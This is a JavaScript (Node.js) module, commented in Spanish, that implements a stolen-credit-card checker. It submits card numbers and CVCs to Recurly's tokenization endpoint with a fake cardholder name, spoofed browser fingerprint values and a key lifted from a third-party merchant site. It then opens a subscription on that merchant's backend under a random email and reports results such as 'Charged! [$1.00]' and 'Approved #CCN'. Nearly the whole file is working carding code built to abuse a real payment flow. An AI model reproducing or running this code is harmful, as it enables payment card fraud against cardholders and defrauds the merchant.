const axios = require('axios');
const FormData = require('form-data');

// Función para verificar una tarjeta
async function checkCard(cardNumber, month, year, cvc) {
    try {
        // Validar entrada
        if (!cardNumber || typeof cardNumber !== 'string') {
            throw new Error('Invalid card number');
        }

        // Limpiar número de tarjeta (remover espacios y caracteres no numéricos)
        const cleanCardNumber = cardNumber.replace(/\D/g, '');

        if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
            throw new Error('Invalid card number length');
        }

        console.log('Starting card check process...');

        // Paso 1: Crear token
        const tokenResponse = await createToken(cleanCardNumber, month, year, cvc);
        console.log('Token created:', tokenResponse.id);

        if (!tokenResponse || !tokenResponse.id) {
            return {
                success: false,
                message: 'Could not create token',
                details: tokenResponse
            };
        }

        // Paso 2: Crear suscripción
        const subscriptionResponse = await createSubscription(tokenResponse.id);
        console.log('Subscription response received');

        // Procesar respuesta
        let status, message;

        if (subscriptionResponse.status === 302 || subscriptionResponse.headers.location) {
            status = "approved";
            message = "Charged! 🟩 [ $1.00 ]";
        } else if (subscriptionResponse.data?.error?.toLowerCase().includes('insufficient funds')) {
            status = "approved";
            message = "Approved! #LowFunds 🟩";
        } else if (subscriptionResponse.data?.error?.toLowerCase().includes('cvv') || 
                  subscriptionResponse.data?.error?.toLowerCase().includes('security code')) {
            status = "approved";
            message = "Approved #CCN! 🟩";
        } else {
            status = "declined";
            message = "Your card was declined. 🔴";
        }

        // Retornar resultado
        return {
            success: true,
            card: {
                number: `${cleanCardNumber.substring(0, 6)}xxxxxx${cleanCardNumber.substring(cleanCardNumber.length - 4)}`,
                brand: getBrandFromNumber(cleanCardNumber),
                bank: getBankFromNumber(cleanCardNumber),
                type: getTypeFromNumber(cleanCardNumber)
            },
            result: message,
            status: status
        };

    } catch (error) {
        console.error('Error in card check process:', error);

        // Manejar errores específicos
        if (error.response?.data?.error?.toLowerCase().includes('cvv') || 
            error.response?.data?.error?.toLowerCase().includes('security code')) {
            return {
                success: true,
                card: {
                    number: `${cardNumber.substring(0, 6)}xxxxxx${cardNumber.substring(cardNumber.length - 4)}`,
                    brand: getBrandFromNumber(cardNumber),
                    bank: getBankFromNumber(cardNumber),
                    type: getTypeFromNumber(cardNumber)
                },
                result: "Approved #CCN! 🟩",
                status: "approved"
            };
        }

        return {
            success: false,
            message: error.message || 'Error checking card',
            error: error.toString()
        };
    }
}

// Crear token con Recurly
async function createToken(cardNumber, month, year, cvc) {
    try {
        const response = await axios.post(
            'https://api.recurly.com/js/v1/token',
            new URLSearchParams({
                'first_name': 'Bruno',
                'last_name': 'Alexis',
                'number': cardNumber,
                'browser[color_depth]': '24',
                'browser[java_enabled]': 'false',
                'browser[language]': 'es-US',
                'browser[referrer_url]': 'https://mysticinsight.online/mi/subscription',
                'browser[screen_height]': '1280',
                'browser[screen_width]': '800',
                'browser[time_zone_offset]': '420',
                'browser[user_agent]': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'month': month,
                'year': year,
                'cvv': cvc,
                'version': '4.33.1',
                'key': 'ewr1-GHqWaQhLRDLkFqmH9MVxeE',
                'deviceId': 'siaXX9TbekYH1S1C',
                'sessionId': 'Z0VJJh0T0F7Zuwmq',
                'instanceId': 'jGAuKKML687jvFC0'
            }).toString(),
            {
                headers: {
                    'authority': 'api.recurly.com',
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://api.recurly.com',
                    'referer': 'https://api.recurly.com/js/v1/field.html',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            }
        );

        return response.data;
    } catch (error) {
        console.error('Error creating token:', error.response?.data || error.message);
        throw error;
    }
}

// Crear suscripción con Recurly
async function createSubscription(tokenId) {
    try {
        const response = await axios.post(
            'https://subtrack.turbograms.com/rec/create-subscription-no-user',
            {
                plan_id: 'msi_lpr_6month',
                token_id: tokenId,
                email: generateRandomEmail(),
                attribution: {
                    event_source_url: 'https://mysticinsight.online/mi/subscription',
                    client_user_agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            },
            {
                headers: {
                    'authority': 'subtrack.turbograms.com',
                    'content-type': 'text/plain',
                    'origin': 'https://mysticinsight.online',
                    'referer': 'https://mysticinsight.online/',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            }
        );

        return response;
    } catch (error) {
        console.error('Error creating subscription:', error.response?.data || error.message);
        throw error;
    }
}

// Funciones auxiliares
function getBrandFromNumber(cardNumber) {
    if (!cardNumber || typeof cardNumber !== 'string') {
        return 'UNKNOWN';
    }

    const firstDigit = cardNumber.charAt(0);
    const firstTwoDigits = cardNumber.substring(0, 2);

    if (firstDigit === '4') return 'VISA';
    if (firstDigit === '5' && ['51','52','53','54','55'].includes(firstTwoDigits)) return 'MASTERCARD';
    if (firstDigit === '3' && ['34','37'].includes(firstTwoDigits)) return 'AMEX';
    if (firstDigit === '6') return 'DISCOVER';
    return 'UNKNOWN';
}

function getBankFromNumber(cardNumber) {
    if (!cardNumber || typeof cardNumber !== 'string') {
        return 'UNKNOWN BANK';
    }
    const bin = cardNumber.substring(0, 6);
    return `BANK (${bin})`;
}

function getTypeFromNumber(cardNumber) {
    if (!cardNumber || typeof cardNumber !== 'string') {
        return 'UNKNOWN';
    }
    return parseInt(cardNumber.slice(-1)) % 2 === 0 ? 'CREDIT' : 'DEBIT';
}

function generateRandomEmail() {
    const names = ['john', 'jane', 'mike', 'sara', 'alex', 'emma', 'james', 'lisa'];
    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    const name = names[Math.floor(Math.random() * names.length)];
    const randomNum = Math.floor(Math.random() * 1000);
    const domain = domains[Math.floor(Math.random() * domains.length)];
    return `${name}${randomNum}@${domain}`;
}

module.exports = {
    checkCard
};